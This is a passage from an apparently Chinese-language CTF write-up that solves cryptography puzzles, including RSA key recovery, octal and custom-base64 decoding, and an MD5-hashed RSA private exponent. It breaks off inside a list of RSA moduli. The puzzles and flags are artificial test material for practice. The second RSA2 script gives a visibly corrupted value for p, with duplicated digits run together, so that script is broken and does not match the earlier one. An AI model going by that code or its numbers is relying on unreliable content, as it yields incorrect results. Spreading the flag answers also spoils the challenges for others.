stretchy="false">(</mo><mi>p</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mi>p</mi><mi>q</mi><mo>+</mo><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mspace linebreak="newline"></mspace><mi>n</mi><mo>=</mo><mi>p</mi><mi>q</mi><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">(p+1)(q+1)=pq+(p+q)+1\\n=pq=(p+1)(q+1)-(p+q)-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p_add_q = <span class="number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span></span><br><span class="line">pq_add_1 = <span class="number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span></span><br><span class="line">e = <span class="number">0xe6b1bee47bd63f615c7d0a43c529d219</span></span><br><span class="line">d = <span class="number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span></span><br><span class="line">c = <span class="number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span></span><br><span class="line">n = pq_add_1 - p_add_q - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">M = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(M))</span><br></pre></td></tr></table></figure><p>得到flag。</p><h3 id="密碼學的心聲"><a class="markdownIt-Anchor" href="#密碼學的心聲"></a> 密碼學的心聲</h3><p>二戰時期，某國軍官與一個音樂家情婦相好，然而自從那時起，他屢戰屢敗，敵人似乎料事如神。他也有懷疑過他的情婦，但是他經過24小時觀察他的情婦，發現她每天都只是作曲，然後彈奏給戰地電台，為士兵們鼓氣，並未有任何逾越。那麼，間諜到底是誰？這張曲譜是否有貓膩？(答案為一個明文字符串，提交獲得的有意義語句通順字符串即可)</p><p><img src="music.png" alt="樂譜" /></p><p>裡面有一句這裡面沒有八，看起來是八進制的解碼，先把樂譜打出來，並轉成16進位。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">c = <span class="number">0o111114157166145123145143165162151164171126145162171115165143150</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(c))</span><br><span class="line"><span class="comment"># 0x49261bcec6529994c675391a4e8792b194e479269d4c668</span></span><br></pre></td></tr></table></figure><p>然後轉base64和ascii都爆了，最後藉由1出現的有點多，分組後發現是八進位的ascii，哭阿。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&#x27;111 114 157 166 145 123 145 143 165 162 151 164 171 126 145 162 171 115 165 143 150&#x27;</span></span><br><span class="line">s = [c.split(<span class="string">&#x27; &#x27;</span>)[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c.split(<span class="string">&#x27; &#x27;</span>)))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i,<span class="number">8</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>拿到flag，我要死掉了。</p><h3 id="bjdctf2020這是base"><a class="markdownIt-Anchor" href="#bjdctf2020這是base"></a> [BJDCTF2020]這是base??</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict:&#123;0: &#x27;J&#x27;, 1: &#x27;K&#x27;, 2: &#x27;L&#x27;, 3: &#x27;M&#x27;, 4: &#x27;N&#x27;, 5: &#x27;O&#x27;, 6: &#x27;x&#x27;, 7: &#x27;y&#x27;, 8: &#x27;U&#x27;, 9: &#x27;V&#x27;, 10: &#x27;z&#x27;, 11: &#x27;A&#x27;, 12: &#x27;B&#x27;, 13: &#x27;C&#x27;, 14: &#x27;D&#x27;, 15: &#x27;E&#x27;, 16: &#x27;F&#x27;, 17: &#x27;G&#x27;, 18: &#x27;H&#x27;, 19: &#x27;7&#x27;, 20: &#x27;8&#x27;, 21: &#x27;9&#x27;, 22: &#x27;P&#x27;, 23: &#x27;Q&#x27;, 24: &#x27;I&#x27;, 25: &#x27;a&#x27;, 26: &#x27;b&#x27;, 27: &#x27;c&#x27;, 28: &#x27;d&#x27;, 29: &#x27;e&#x27;, 30: &#x27;f&#x27;, 31: &#x27;g&#x27;, 32: &#x27;h&#x27;, 33: &#x27;i&#x27;, 34: &#x27;j&#x27;, 35: &#x27;k&#x27;, 36: &#x27;l&#x27;, 37: &#x27;m&#x27;, 38: &#x27;W&#x27;, 39: &#x27;X&#x27;, 40: &#x27;Y&#x27;, 41: &#x27;Z&#x27;, 42: &#x27;0&#x27;, 43: &#x27;1&#x27;, 44: &#x27;2&#x27;, 45: &#x27;3&#x27;, 46: &#x27;4&#x27;, 47: &#x27;5&#x27;, 48: &#x27;6&#x27;, 49: &#x27;R&#x27;, 50: &#x27;S&#x27;, 51: &#x27;T&#x27;, 52: &#x27;n&#x27;, 53: &#x27;o&#x27;, 54: &#x27;p&#x27;, 55: &#x27;q&#x27;, 56: &#x27;r&#x27;, 57: &#x27;s&#x27;, 58: &#x27;t&#x27;, 59: &#x27;u&#x27;, 60: &#x27;v&#x27;, 61: &#x27;w&#x27;, 62: &#x27;+&#x27;, 63: &#x27;/&#x27;, 64: &#x27;=&#x27;&#125;</span><br><span class="line"></span><br><span class="line">chipertext:</span><br><span class="line">FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw</span><br></pre></td></tr></table></figure><p>感覺是替換加密，拿base64依照字典做decoder，不知道會不會搞，但就先建字典做轉換。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="number">0</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;O&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;U&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;V&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">        <span class="number">13</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;H&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">20</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">        <span class="number">25</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">27</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">32</span>: <span class="string">&#x27;h&#x27;</span>, <span class="number">33</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">        <span class="number">37</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">38</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="number">41</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">42</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="number">49</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;S&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;p&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">60</span>: <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">        <span class="number">61</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;+&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;/&#x27;</span>, <span class="number">64</span>: <span class="string">&#x27;=&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">base64_list = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">chipertext = <span class="string">&#x27;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&#x27;</span></span><br><span class="line">m = <span class="built_in">str</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> chipertext:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span> c == <span class="built_in">dict</span>[j]:</span><br><span class="line">            m += base64_list[j]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(m))</span><br></pre></td></tr></table></figure><p>取得flag。</p><h3 id="rsa2"><a class="markdownIt-Anchor" href="#rsa2"></a> RSA2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span><br><span class="line">e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span><br><span class="line"></span><br><span class="line">import hashlib</span><br><span class="line">flag = &quot;flag&#123;&quot; + hashlib.md5(hex(d)).hexdigest() + &quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p>題目給出的資訊中，少了d，因此先查md5的加密，好像沒有結果，後來想想應該是靠N, e求d再做MD5雜湊加密而已，這樣就好做ㄌ。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># by http://www.factordb.com/index.php</span></span><br><span class="line">p = <span class="number">9046853915223503351787031888977627106934564043204783593118678181991596316582877057556463152579621699010610569526573031954779520781448550677767565207407183</span></span><br><span class="line">q = <span class="number">11273732364123571293429600400343309403733952146912318879993851141423284675797325272321856863528776914709992821287788339848962916204774010644058033316303937</span></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="comment"># print(d)</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="built_in">hex</span>(d).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>然後弄出來的flag{cb51252e8f42f4f84aa9fb5b41e141ff}沒過，應該是因為python2和3的算出來的結果會不一樣，python2的hex會在字尾多加一個L，所以補上就好。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># by http://www.factordb.com/index.php</span></span><br><span class="line">p = <span class="number">90468539152235033517870318889776271069345640432047835931186781819915963165828770575564631525796216990106105695265730319547795207814485506777675652074071839046853915223503351787031888977627106934564043204783593118678181991596316582877057556463152579621699010610569526573031954779520781448550677767565207407183</span></span><br><span class="line">q = <span class="number">11273732364123571293429600400343309403733952146912318879993851141423284675797325272321856863528776914709992821287788339848962916204774010644058033316303937</span></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="built_in">hex</span> = <span class="built_in">hex</span>(d)+<span class="string">&#x27;L&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="built_in">hex</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>取得flag。</p><h3 id="rsa5"><a class="markdownIt-Anchor" href="#rsa5"></a> RSA5</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = xxxxxxxx</span><br><span class="line">e = 65537</span><br><span class="line">========== n c ==========</span><br><span class="line">n = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span><br><span class="line">c = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span><br><span class="line"></span><br><span class="line">n = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span><br><span class="line">c = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span><br><span class="line"></span><br><span class="line">n = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span><br><span class="line">c = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span><br><span class="line"></span><br><span class="line">n = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span><br><span class="line">c = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span><br><span class="line"></span><br><span class="line">n = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span><br><span class="line">c = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span><br><span class="line"></span><br><span class="line">n = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span><br><span class="line">c = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span><br><span class="line"></span><br><span class="line">n = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span><br><span class="line">c = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span><br><span class="line"></span><br><span class="line">n = 